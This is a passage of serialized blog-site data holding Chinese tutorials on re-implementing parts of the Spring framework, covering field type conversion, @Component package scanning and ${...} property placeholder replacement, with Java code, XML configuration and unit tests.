{\n                        value = conversionservice.convert(value, targettype);\n                    }\n                }\n            }\n            // 属性填充\n            beanutil.setfieldvalue(bean, name, value);\n        }\n    } catch (exception e) {\n        throw new beansexception("failed to bean applypropertyvalues", e);\n    }\n}\n\n// @value 解析属性值的类型转换，autowiredannotationbeanpostprocessor#postprocesspropertyvalues()\npublic propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) {\n    class<?> clazz = bean.getclass();\n    clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n\n    // 处理 @value 注解\n    field[] declaredfields = clazz.getdeclaredfields();\n    for (field field : declaredfields) {\n        value valueannotation = field.getdeclaredannotation(value.class);\n        if (valueannotation != null) {\n            object value = valueannotation.value();\n            value = beanfactory.resolveembeddedvalue((string) value);\n\n            // 类型转换\n            class<?> sourcetype = value.getclass();\n            class<?> targettype = (class<?>) typeutil.gettype(field);\n            conversionservice conversionservice = beanfactory.getconversionservice();\n            if (conversionservice != null) {\n                if (conversionservice.canconvert(sourcetype, targettype)) {\n                    value = conversionservice.convert(value, targettype);\n                }\n            }\n\n            beanutil.setfieldvalue(bean, field.getname(), value);\n        }\n    }\n\n    // 处理 @autowired 注解\n    for (field field : declaredfields) {\n        autowired autowiredannotation = field.getannotation(autowired.class);\n        if (autowiredannotation != null) {\n            class<?> fieldtype = field.gettype();\n            object dependentbean = null;\n            qualifier qualifierannotation = field.getdeclaredannotation(qualifier.class);\n            // 优先按照 @qualifier 注入，再按照类型注入\n            if (qualifierannotation != null) {\n                string dependentbeanname = qualifierannotation.value();\n                dependentbean = beanfactory.getbean(dependentbeanname, fieldtype);\n            } else {\n                dependentbean = beanfactory.getbean(fieldtype);\n            }\n            beanutil.setfieldvalue(bean, field.getname(), dependentbean);\n        }\n    }\n\n    return pvs;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n\n\n\n# 测试\n\n * xml 准备，spring-field-convert.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans>\n    \x3c!--  目标类  --\x3e\n    <bean class="com.snail.springframework.convert.fieldconvertpo">\n        <property name="name" value="fieldconvertponame"></property>\n        <property name="date" value="2000-10-10 10:10:10"></property>\n    </bean>\n\n    <bean id="converters" class="com.snail.springframework.convert.convertersfactorybean"></bean>\n\n    <bean class="com.snail.springframework.context.support.conversionservicefactorybean">\n        <property name="converters" ref="converters"></property>\n    </bean>\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n * 提前准备，实体类 fieldconvertpo，stringtodateconverter，stringtonumberconverter，convertersfactorybean\n\npublic class fieldconvertpo {\n\n    private string name;\n\n    private date date;\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public date getdate() {\n        return date;\n    }\n\n    public void setdate(date date) {\n        this.date = date;\n    }\n\n    @override\n    public string tostring() {\n        return "fieldconvertpo{" +\n                "name=\'" + name + \'\\\'\' +\n                ", date=" + date +\n                \'}\';\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nstringtodateconverter\n\npublic class stringtodateconverter implements converter<string, date> {\n\n    @override\n    public date convert(string source) {\n        return dateutil.parse(source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nstringtonumberconverter\n\npublic class stringtonumberconverter implements converter<string, number> {\n\n    @override\n    public number convert(string source) {\n        return convert.convert(number.class, source);\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nconvertersfactorybean\n\npublic class convertersfactorybean implements factorybean<set<?>> {\n\n    @override\n    public set<?> getobject() {\n        hashset<object> converts = new hashset<>();\n        stringtodateconverter stringtodateconverter = new stringtodateconverter();\n        converts.add(stringtodateconverter);\n        return converts;\n    }\n\n    @override\n    public class<?> getobjecttype() {\n        return null;\n    }\n\n    @override\n    public boolean issingleton() {\n        return true;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n * 测试类\n\npublic class springfieldconverttest {\n\n    /**\n     * 测试三级缓存循环引用\n     */\n    @test\n    public void test_field_convert() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring-field-convert.xml");\n        fieldconvertpo fieldconvertpo = applicationcontext.getbean(fieldconvertpo.class);\n        system.out.println("测试结果：" + fieldconvertpo);\n        // 测试结果：fieldconvertpo{name=\'fieldconvertponame\', date=tue oct 10 10:10:10 cst 2000}\n    }\n\n    @test\n    public void test_stringtonumberconverter() {\n        stringtonumberconverter stringtonumberconverter = new stringtonumberconverter();\n        number n1 = stringtonumberconverter.convert("123");\n        system.out.println("测试结果：" + n1);\n        number n2 = stringtonumberconverter.convert("123.12");\n        system.out.println("测试结果：" + n2);\n        // 测试结果：123\n        // 测试结果：123.12\n    }\n\n    @test\n    public void test_stringtonumberconverterfactory() {\n        stringtonumberconverterfactory converterfactory = new stringtonumberconverterfactory();\n        converter<string, integer> integerconverter = converterfactory.getconverter(integer.class);\n        number n1 = integerconverter.convert("123.45");\n        system.out.println("测试结果：" + n1);\n        converter<string, long> longconverter = converterfactory.getconverter(long.class);\n        number n2 = longconverter.convert("123.12");\n        system.out.println("测试结果：" + n2);\n        converter<string, double> doubleconverter = converterfactory.getconverter(double.class);\n        number n3 = doubleconverter.convert("123.78");\n        system.out.println("测试结果：" + n3);\n        // 测试结果：123\n        // 测试结果：123\n        // 测试结果：123.78\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n * 测试结果\n\n如上\n\n\n1\n\n\n\n# 总结\n\n思考或借鉴：如何把一个转换操作抽象为接口适配、工厂模型等方式，还是很值得借鉴的。',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"手写 Spring 11 - Bean注解方式扫描，Bean属性xml解析替换",frontmatter:{title:"手写 Spring 11 - Bean注解方式扫描，Bean属性xml解析替换",date:"2023-12-12T00:00:00.000Z",tags:["源码分析","Java"],categories:["后端 Back-end"],isShowComments:!0},regularPath:"/views/backend/spring-source-11.html",relativePath:"views/backend/spring-source-11.md",key:"v-634513e4",path:"/views/backend/spring-source-11.html",headers:[{level:2,title:"解析",slug:"解析",normalizedTitle:"解析",charIndex:3},{level:2,title:"Bean注解方式扫描",slug:"bean注解方式扫描",normalizedTitle:"bean注解方式扫描",charIndex:9},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力",normalizedTitle:"定义一些职责和能力",charIndex:25},{level:3,title:"具体的实现",slug:"具体的实现",normalizedTitle:"具体的实现",charIndex:40},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中",normalizedTitle:"将实现加入原有的逻辑中",charIndex:51},{level:3,title:"测试",slug:"测试",normalizedTitle:"测试",charIndex:68},{level:2,title:"Bean属性Xml配置替换",slug:"bean属性xml配置替换",normalizedTitle:"bean属性xml配置替换",charIndex:74},{level:3,title:"定义一些职责和能力",slug:"定义一些职责和能力-2",normalizedTitle:"定义一些职责和能力",charIndex:25},{level:3,title:"具体的实现",slug:"具体的实现-2",normalizedTitle:"具体的实现",charIndex:40},{level:3,title:"将实现加入原有的逻辑中",slug:"将实现加入原有的逻辑中-2",normalizedTitle:"将实现加入原有的逻辑中",charIndex:51},{level:3,title:"测试",slug:"测试-2",normalizedTitle:"测试",charIndex:68},{level:2,title:"总结",slug:"总结",normalizedTitle:"总结",charIndex:142}],excerpt:"<Boxx/>\n",headersStr:"解析 Bean注解方式扫描 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 Bean属性Xml配置替换 定义一些职责和能力 具体的实现 将实现加入原有的逻辑中 测试 总结",content:' * 解析\n * Bean注解方式扫描\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * Bean属性Xml配置替换\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n * Bean 注解方式扫描：之前已经实现了从 xml 配置的 bean 加载到容器中。扫描注解加载 bean 无非就是从 xml 中获取要扫描的包路径，然后将解析注解加载 BeanDefinition 的过程插入到之前的解析 xml 配置 bean 的流程中。\n\n> 不管是从 xml 配置的 bean，还是从注解扫描的 bean，其实都是先组装为 BeanDefinition 对象。\n> \n> 在容器 getBean() 的时候，才将相应的 BeanDefinition 实例化为真正的对象。\n\n * Bean 属性 Xml 配置替换：其实就是利用 Spring 自带的 BeanDefinition 扩展点接口（BeanFactoryPostProcessor），创建 BeanDefinition 之后，但在创建 Bean 实例之前。提供修改 BeanDefinition 的机会。只要实现这个接口我们就可以修改 Bean 的属性替换了。\n\n\n# Bean注解方式扫描\n\n定义注解 @Component，定义工具类可以扫描指定包下的所有符合规则的类文件。\n\n修改 XmlBeanDefinitionReader 在加载 xml 文件时，取出 component-scan 属性用于支持此次逻辑（扫描注解添加到容器中）的添加。\n\n同时本次再添加注解 @Scope，用于 Bean 的作用域。\n\n\n# 定义一些职责和能力\n\n 1. @Component，@Scope\n 2. ClassPathScanningCandidateComponentProvider：类路径扫描候选组件提供程序，从指定报下找出指定类组装为一个BeanDefinition。\n 3. ClassPathBeanDefinitionScanner： 继承自ClassPathScanningCandidateComponentProvider，还支持解析 bean 的作用域及最终 bean 的名字，同时还具备向容器中添加 BeanDefinition 的能力。\n 4. XmlBeanDefinitionReader：将从注解加载 BeanDefinition 的能力，融入到在加载解析 xml 文件过程中。\n\n\n# 具体的实现\n\n 1. ClassPathScanningCandidateComponentProvider\n\npublic class ClassPathScanningCandidateComponentProvider {\n\n    /**\n     * 查找 @Component 候选组件\n     *\n     * @param basePackage 基本包\n     * @return {@link Set}<{@link BeanDefinition}>\n     */\n    public Set<BeanDefinition> findCandidateComponents(String basePackage) {\n        LinkedHashSet<BeanDefinition> candidates = new LinkedHashSet<>();\n        Set<Class<?>> classes = ClassUtil.scanPackageByAnnotation(basePackage, Component.class);\n        for (Class<?> clazz : classes) {\n            candidates.add(new BeanDefinition(clazz));\n        }\n        return candidates;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. ClassPathBeanDefinitionScanner\n\npublic class ClassPathBeanDefinitionScanner \n    extends ClassPathScanningCandidateComponentProvider {\n\n    private final BeanDefinitionRegistry registry;\n\n    public ClassPathBeanDefinitionScanner(BeanDefinitionRegistry registry) {\n        this.registry = registry;\n    }\n\n    /**\n     * 扫描指定包下的所有文件，判断是否含有指定注解，将符合规则的文件转换为 BeanDefinition 加入到容器中\n     *\n     * @param basePackages 基本程序包\n     */\n    public void doScan(String... basePackages) {\n        for (String basePackage : basePackages) {\n            Set<BeanDefinition> candidates = findCandidateComponents(basePackage);\n            for (BeanDefinition beanDefinition : candidates) {\n                // 解析 Bean 的作用域和属性\n                String scope = resolveBeanScope(beanDefinition);\n                if (CharSequenceUtil.isNotBlank(scope)) {\n                    beanDefinition.setScope(scope);\n                }\n                registry.registerBeanDefinition(determineBeanName(beanDefinition), beanDefinition);\n            }\n        }\n    }\n\n    /**\n     * 解析 bean 作用域\n     *\n     * @param beanDefinition bean定义\n     * @return {@link String}\n     */\n    private String resolveBeanScope(BeanDefinition beanDefinition) {\n        Class<?> beanClass = beanDefinition.getBeanClass();\n        Scope scope = beanClass.getAnnotation(Scope.class);\n        if (scope != null && CharSequenceUtil.isNotBlank(scope.value())) {\n            return scope.value();\n        }\n        return "";\n    }\n\n    /**\n     * 确定 bean 名称\n     *\n     * @param beanDefinition bean定义\n     * @return {@link String}\n     */\n    private String determineBeanName(BeanDefinition beanDefinition) {\n        Class<?> beanClass = beanDefinition.getBeanClass();\n        Component component = beanClass.getAnnotation(Component.class);\n        if (component != null && CharSequenceUtil.isNotBlank(component.value())) {\n            return component.value();\n        }\n        return CharSequenceUtil.lowerFirst(beanClass.getSimpleName());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改 XmlBeanDefinitionReader#doLoadBeanDefinitions()，因为最终这里会解析 xml 文件，组装 BeanDefinition 加入到容器中。\n\nprivate void doLoadBeanDefinitions(InputStream inputStream) throws ClassNotFoundException, DocumentException {\n    SAXReader reader = new SAXReader();\n    Document document = reader.read(inputStream);\n    Element root = document.getRootElement();\n\n    // 解析 component-scan 标签，从指定包下扫描类文件并加载为 BeanDefinition 对象。这里包含了属性表达式值的替换操作。\n    Element componentScan = root.element("component-scan");\n    if (componentScan != null) {\n        String scanPath = componentScan.attributeValue("base-package");\n        if (StrUtil.isBlank(scanPath)) {\n            throw new BeansException("The value of base-package attribute can not be empty or null");\n        }\n        scanPackage(scanPath);\n    }\n\n    // 解析 <bean> 标签，从 xml 配置文件中加载为 BeanDefinition\n    List<Element> beanList = root.elements("bean");\n    for (Element bean : beanList) {\n        // 1. 解析 bean 标签\n        String id = bean.attributeValue("id");\n        String name = bean.attributeValue("name");\n        \n        // 省略...\n\n        // 5. 注册 BeanDefinition\n        getRegistry().registerBeanDefinition(beanName, beanDefinition);\n    }\n}\n\n/**\n * 从指定包下，扫描注解类，组装 BeanDefinition 加入到容器中\n *\n * @param scanPath 扫描路径\n */\nprivate void scanPackage(String scanPath) {\n    String[] basePackages = StrUtil.splitToArray(scanPath, ",");\n    ClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(getRegistry());\n    scanner.doScan(basePackages);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 测试\n\n * xml 准备，spring-component-scan.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/context">\n\n    \x3c!--  ↓↓ spring @Component 测试 ↓↓ --\x3e\n    <context:component-scan base-package="com.snail.springframework.beans.factory.bean"/>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 提前准备，指定包下带注解的类。\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.stereotype.Component;\n\n@Component\npublic class RabbitComponent implements Animal {\n\n    private String nameFromPropertyPlaceholder;\n\n    @Override\n    public String getAnimalName() {\n        return nameFromPropertyPlaceholder;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\npublic class SpringComponentPropertyTest {\n\n    /**\n     * 测试从指定包下扫描 @Component 注解\n     * RabbitComponent 的属性没有赋值，返回结果应该是 null\n     */\n    @Test\n    public void test_scan_component() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-component-scan.xml");\n        RabbitComponent rabbitComponent = (RabbitComponent) applicationContext.getBean("rabbitComponent");\n        System.out.println("测试结果：" + rabbitComponent.getAnimalName());\n        // 测试结果：null\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试结果\n\n测试结果：null\n\n\n1\n\n\n\n# Bean属性Xml配置替换\n\n前提知识点：\n\nBeanFactoryPostProcessor 接口：创建 BeanDefinition 之后，但在创建 Bean 实例之前，提供修改 BeanDefinition 的机会。\n\n解析：\n\n提前准备好属性替换的 properties 配置文件。再利用 Spring 自带的 BeanDefinition 扩展点接口（BeanFactoryPostProcessor），只要实现这个接口我们就可以修改 Bean 的属性替换了。\n\n\n# 定义一些职责和能力\n\n 1. PropertyPlaceholderConfigurer，实现了 BeanFactoryPostProcessor 接口。从配置文件加载占位符的 key value，在 bean 实例化之前，更改属性信息。\n\n\n# 具体的实现\n\n 1. PropertyPlaceholderConfigurer\n\n/**\n * bean对象 占位符处理 <br/>\n * 从配置文件加载占位符的 key value，在 bean 实例化之前，更改属性信息。\n */\npublic class PropertyPlaceholderConfigurer \n    implements BeanFactoryPostProcessor {\n\n    /**\n     * 默认占位符前缀\n     */\n    public static final String DEFAULT_PLACEHOLDER_PREFIX = "${";\n\n    /**\n     * 默认占位符后缀\n     */\n    public static final String DEFAULT_PLACEHOLDER_SUFFIX = "}";\n\n    private String location;\n\n    @Override\n    public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) {\n        // 加载属性文件\n        DefaultResourceLoader resourceLoader = new DefaultResourceLoader();\n        Properties properties = new Properties();\n        try {\n            properties.load(resourceLoader.getResource(location).getInputStream());\n        } catch (IOException e) {\n            throw new BeansException("Could not load properties", e);\n        }\n\n        // 遍历所有bean的属性值，符合规则的替换\n        String[] beanDefinitionNames = beanFactory.getBeanDefinitionNames();\n        for (String beanName : beanDefinitionNames) {\n            BeanDefinition beanDefinition = beanFactory.getBeanDefinition(beanName);\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                Object value = propertyValue.getValue();\n                if (!(value instanceof String)) {\n                    continue;\n                }\n                String strValue = (String) value;\n                StringBuilder builder = new StringBuilder(strValue);\n                int startIdx = strValue.indexOf(DEFAULT_PLACEHOLDER_PREFIX);\n                int stopIdx = strValue.indexOf(DEFAULT_PLACEHOLDER_SUFFIX);\n                if (startIdx != -1 && stopIdx != -1 && startIdx < stopIdx) {\n                    String key = strValue.substring(startIdx + 2, stopIdx);\n                    String val = properties.getProperty(key);\n                    builder.replace(startIdx, stopIdx + 1, val);\n                    propertyValues.addPropertyValue(new PropertyValue(propertyValue.getName(), builder.toString()));\n                }\n                propertyValue.setValue(builder.toString());\n            }\n        }\n    }\n\n    public void setLocation(String location) {\n        this.location = location;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n\n# 将实现加入原有的逻辑中\n\n 1. PropertyPlaceholderConfigurer 实现了 BeanFactoryPostProcessor --\x3e Spring 容器中 BeanDefinition 的扩展点，创建 BeanDefinition 之后，但在创建 Bean 实例之前。修改 BeanDefinition 的属性。\n\n\n# 测试\n\n * xml 准备，spring-component-property.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/context">\n\n    \x3c!--  ↓↓ spring propertyPlaceholder 测试 ↓↓ --\x3e\n    \x3c!--  配置属性表达式解析器  --\x3e\n    <bean class="com.snail.springframework.beans.factory.PropertyPlaceholderConfigurer">\n        <property name="location" value="classpath:spring-component-property.properties"></property>\n    </bean>\n\n    \x3c!--  从xml加载bean实例  --\x3e\n    <bean id="rabbitComponent"\n        class="com.snail.springframework.beans.factory.bean.RabbitComponent">\n        <property name="nameFromPropertyPlaceholder" value="${nameFromPropertyPlaceholder}"></property>\n    </bean>\n\n</beans>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n再准备一个配置文件：spring-component-property.properties，用于 ${nameFromPropertyPlaceholder} 属性替换。\n\nnameFromPropertyPlaceholder=rabbit001\n\n\n1\n\n * 提前准备，还是 RabbitComponent，这次只不过是从 xml 配置的 bean。\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.stereotype.Component;\n\n@Component\npublic class RabbitComponent implements Animal {\n\n    private String nameFromPropertyPlaceholder;\n\n    @Override\n    public String getAnimalName() {\n        return nameFromPropertyPlaceholder;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\npublic class SpringComponentPropertyTest {\n\n    /**\n     * 测试从配置文件加载 bean，并且完成 bean 类的 ${value} 属性替换\n     * RabbitComponent 的属性从配置文件 ${nameFromPropertyPlaceholder} 完成替换\n     */\n    @Test\n    public void test_scan_properties_replace() {\n        ClassPathXmlApplicationContext applicationContext = new ClassPathXmlApplicationContext("classpath:spring-component-property.xml");\n        RabbitComponent rabbitComponent = (RabbitComponent) applicationContext.getBean("rabbitComponent");\n        System.out.println("测试结果：" + rabbitComponent.getAnimalName());\n        // 测试结果：rabbit001\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试结果\n\n测试结果：rabbit001\n\n\n1\n\n\n\n# 总结\n\n从外部文件加载到容器中，不管是从 xml 配置的 bean，还是从注解扫描的 bean，其实都是先组装为 BeanDefinition 对象。\n\n只有在首次在容器 getBean() 的时候，才将相应的 BeanDefinition 实例化为真正的对象。\n\n同时也知道了 BeanFactoryPostProcessor 接口的作用 --\x3e Spring 容器中 BeanDefinition 的扩展点，创建 BeanDefinition 之后，但在创建 Bean 实例之前。提供了一次修改 BeanDefinition 的机会。',normalizedContent:' * 解析\n * bean注解方式扫描\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * bean属性xml配置替换\n   * 定义一些职责和能力\n   * 具体的实现\n   * 将实现加入原有的逻辑中\n   * 测试\n * 总结\n\n\n\n\n# 解析\n\n * bean 注解方式扫描：之前已经实现了从 xml 配置的 bean 加载到容器中。扫描注解加载 bean 无非就是从 xml 中获取要扫描的包路径，然后将解析注解加载 beandefinition 的过程插入到之前的解析 xml 配置 bean 的流程中。\n\n> 不管是从 xml 配置的 bean，还是从注解扫描的 bean，其实都是先组装为 beandefinition 对象。\n> \n> 在容器 getbean() 的时候，才将相应的 beandefinition 实例化为真正的对象。\n\n * bean 属性 xml 配置替换：其实就是利用 spring 自带的 beandefinition 扩展点接口（beanfactorypostprocessor），创建 beandefinition 之后，但在创建 bean 实例之前。提供修改 beandefinition 的机会。只要实现这个接口我们就可以修改 bean 的属性替换了。\n\n\n# bean注解方式扫描\n\n定义注解 @component，定义工具类可以扫描指定包下的所有符合规则的类文件。\n\n修改 xmlbeandefinitionreader 在加载 xml 文件时，取出 component-scan 属性用于支持此次逻辑（扫描注解添加到容器中）的添加。\n\n同时本次再添加注解 @scope，用于 bean 的作用域。\n\n\n# 定义一些职责和能力\n\n 1. @component，@scope\n 2. classpathscanningcandidatecomponentprovider：类路径扫描候选组件提供程序，从指定报下找出指定类组装为一个beandefinition。\n 3. classpathbeandefinitionscanner： 继承自classpathscanningcandidatecomponentprovider，还支持解析 bean 的作用域及最终 bean 的名字，同时还具备向容器中添加 beandefinition 的能力。\n 4. xmlbeandefinitionreader：将从注解加载 beandefinition 的能力，融入到在加载解析 xml 文件过程中。\n\n\n# 具体的实现\n\n 1. classpathscanningcandidatecomponentprovider\n\npublic class classpathscanningcandidatecomponentprovider {\n\n    /**\n     * 查找 @component 候选组件\n     *\n     * @param basepackage 基本包\n     * @return {@link set}<{@link beandefinition}>\n     */\n    public set<beandefinition> findcandidatecomponents(string basepackage) {\n        linkedhashset<beandefinition> candidates = new linkedhashset<>();\n        set<class<?>> classes = classutil.scanpackagebyannotation(basepackage, component.class);\n        for (class<?> clazz : classes) {\n            candidates.add(new beandefinition(clazz));\n        }\n        return candidates;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n 2. classpathbeandefinitionscanner\n\npublic class classpathbeandefinitionscanner \n    extends classpathscanningcandidatecomponentprovider {\n\n    private final beandefinitionregistry registry;\n\n    public classpathbeandefinitionscanner(beandefinitionregistry registry) {\n        this.registry = registry;\n    }\n\n    /**\n     * 扫描指定包下的所有文件，判断是否含有指定注解，将符合规则的文件转换为 beandefinition 加入到容器中\n     *\n     * @param basepackages 基本程序包\n     */\n    public void doscan(string... basepackages) {\n        for (string basepackage : basepackages) {\n            set<beandefinition> candidates = findcandidatecomponents(basepackage);\n            for (beandefinition beandefinition : candidates) {\n                // 解析 bean 的作用域和属性\n                string scope = resolvebeanscope(beandefinition);\n                if (charsequenceutil.isnotblank(scope)) {\n                    beandefinition.setscope(scope);\n                }\n                registry.registerbeandefinition(determinebeanname(beandefinition), beandefinition);\n            }\n        }\n    }\n\n    /**\n     * 解析 bean 作用域\n     *\n     * @param beandefinition bean定义\n     * @return {@link string}\n     */\n    private string resolvebeanscope(beandefinition beandefinition) {\n        class<?> beanclass = beandefinition.getbeanclass();\n        scope scope = beanclass.getannotation(scope.class);\n        if (scope != null && charsequenceutil.isnotblank(scope.value())) {\n            return scope.value();\n        }\n        return "";\n    }\n\n    /**\n     * 确定 bean 名称\n     *\n     * @param beandefinition bean定义\n     * @return {@link string}\n     */\n    private string determinebeanname(beandefinition beandefinition) {\n        class<?> beanclass = beandefinition.getbeanclass();\n        component component = beanclass.getannotation(component.class);\n        if (component != null && charsequenceutil.isnotblank(component.value())) {\n            return component.value();\n        }\n        return charsequenceutil.lowerfirst(beanclass.getsimplename());\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n\n\n\n# 将实现加入原有的逻辑中\n\n * 修改 xmlbeandefinitionreader#doloadbeandefinitions()，因为最终这里会解析 xml 文件，组装 beandefinition 加入到容器中。\n\nprivate void doloadbeandefinitions(inputstream inputstream) throws classnotfoundexception, documentexception {\n    saxreader reader = new saxreader();\n    document document = reader.read(inputstream);\n    element root = document.getrootelement();\n\n    // 解析 component-scan 标签，从指定包下扫描类文件并加载为 beandefinition 对象。这里包含了属性表达式值的替换操作。\n    element componentscan = root.element("component-scan");\n    if (componentscan != null) {\n        string scanpath = componentscan.attributevalue("base-package");\n        if (strutil.isblank(scanpath)) {\n            throw new beansexception("the value of base-package attribute can not be empty or null");\n        }\n        scanpackage(scanpath);\n    }\n\n    // 解析 <bean> 标签，从 xml 配置文件中加载为 beandefinition\n    list<element> beanlist = root.elements("bean");\n    for (element bean : beanlist) {\n        // 1. 解析 bean 标签\n        string id = bean.attributevalue("id");\n        string name = bean.attributevalue("name");\n        \n        // 省略...\n\n        // 5. 注册 beandefinition\n        getregistry().registerbeandefinition(beanname, beandefinition);\n    }\n}\n\n/**\n * 从指定包下，扫描注解类，组装 beandefinition 加入到容器中\n *\n * @param scanpath 扫描路径\n */\nprivate void scanpackage(string scanpath) {\n    string[] basepackages = strutil.splittoarray(scanpath, ",");\n    classpathbeandefinitionscanner scanner = new classpathbeandefinitionscanner(getregistry());\n    scanner.doscan(basepackages);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n# 测试\n\n * xml 准备，spring-component-scan.xml。\n\n<?xml version="1.0" encoding="utf-8" ?>\n\n<beans xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemalocation="http://www.springframework.org/schema/context">\n\n    \x3c!--  ↓↓ spring @component 测试 ↓↓ --\x3e\n    <context:component-scan base-package="com.snail.springframework.beans.factory.bean"/>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * 提前准备，指定包下带注解的类。\n\npackage com.snail.springframework.beans.factory.bean;\n\nimport com.snail.springframework.stereotype.component;\n\n@component\npublic class rabbitcomponent implements animal {\n\n    private string namefrompropertyplaceholder;\n\n    @override\n    public string getanimalname() {\n        return namefrompropertyplaceholder;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n * 测试类\n\npublic class springcomponentpropertytest {\n\n    /**\n     * 测试从指定包下扫描 @component 注解\n     * rabbitcomponent 的属性没有赋值，返回结果应该是 null\n     */\n    @test\n    public void test_scan_component() {\n        classpathxmlapplicationcontext applicationcontext = new 